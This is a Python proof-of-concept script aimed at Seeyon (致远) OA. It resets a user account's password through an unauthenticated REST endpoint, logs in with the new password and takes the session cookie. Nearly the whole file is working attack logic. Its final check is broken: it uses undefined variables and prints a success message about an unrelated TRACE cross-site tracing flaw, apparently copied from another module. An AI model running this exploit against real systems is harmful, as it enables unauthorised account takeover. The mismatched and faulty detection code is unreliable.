'''
Function:
    致远OA ucpcLogin密码重置
Author:
    花果山
Wechat official account：
    中龙 红客突击队
Official website：
    https://www.hscsec.cn/
Email：
    spmonkey@hscsec.cn
Blog:
    https://spmonkey.github.io/
GitHub:
    https://github.com/spmonkey/
'''
# -*- coding: utf-8 -*-
import json
import requests
import random
import string
import os
import sys
from urllib.parse import urlparse
from requests.packages.urllib3 import disable_warnings
disable_warnings()
# path = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
# sys.path.append(path)
# from modules import get_user_agent


class poc:
    def __init__(self, url, proxies):
        self.url = url
        self.headers1 = {
            # 'User-Agent': get_user_agent.get_user_agent(),
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:123.0) Gecko/20100101 Firefox/123.0',
        }
        self.headers2 = {
            # 'User-Agent': get_user_agent.get_user_agent(),
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:123.0) Gecko/20100101 Firefox/123.0',
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        self.headers3 = {
            # 'User-Agent': get_user_agent.get_user_agent(),
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:123.0) Gecko/20100101 Firefox/123.0',
            'Content-Type': 'application/json'
        }
        self.result_text = ""
        self.proxies = proxies

    def host(self):
        url = urlparse(self.url)
        netloc = url.netloc
        scheme = url.scheme
        return netloc, scheme

    def vuln(self, netloc, scheme):
        url1 = "{}://{}/seeyon/rest/orgMember/-4401606663639775639/password/share.do".format(scheme, netloc)
        url3 = "{}://{}/seeyon/rest/m3/login/getCurrentUser".format(scheme, netloc)
        data3 = '{"": ""}'
        try:
            result1 = requests.request(method="PUT", url=url1, headers=self.headers1, verify=False, proxies=self.proxies)
            loginName = result1.json()['successMsgs'][0]['ent']['loginName']
            url2 = "{}://{}/seeyon/rest/authentication/ucpcLogin?login_username={}&login_password=share.do&ticket=".format(scheme, netloc, loginName)
            result2 = requests.post(url=url2, headers=self.headers2, verify=False, proxies=self.proxies)
            if result2.json()['LoginOK'] == 'ok':
                cookie = result2.headers['Set-Cookie'].split(";")[0] + ';'
                self.headers3["Cookie"] = cookie
                result3 = requests.post(url=url3, data=data3, headers=self.headers3, verify=False, proxies=self.proxies)
                if "页面存在相关内容" in result.text:
                    target = urlparse(url)
                    if target.query != "":
                        self.result_text += """\n        [+]    \033[32m检测到目标站点存在跨站式追踪攻击漏洞\033[0m
                     TRACE {} HTTP/1.1
                     Host: {}""".format(target.path + "?" + target.query, target.netloc)
                    else:
                        self.result_text += """\n        [+]    \033[32m检测到目标站点存在跨站式追踪攻击漏洞\033[0m
                     TRACE {} HTTP/1.1
                     Host: {}""".format(target.path, target.netloc)
                    for request_type, request_text in dict(result.request.headers).items():
                        self.result_text += "\n                 {}: {}".format(request_type, request_text)
                    return True
                else:
                    return False
            else:
                return False
        except:
            return False

    def main(self):
        all = self.host()
        netloc = all[0]
        scheme = all[1]
        if self.vuln(netloc, scheme):
            return self.result_text
        else:
            return False

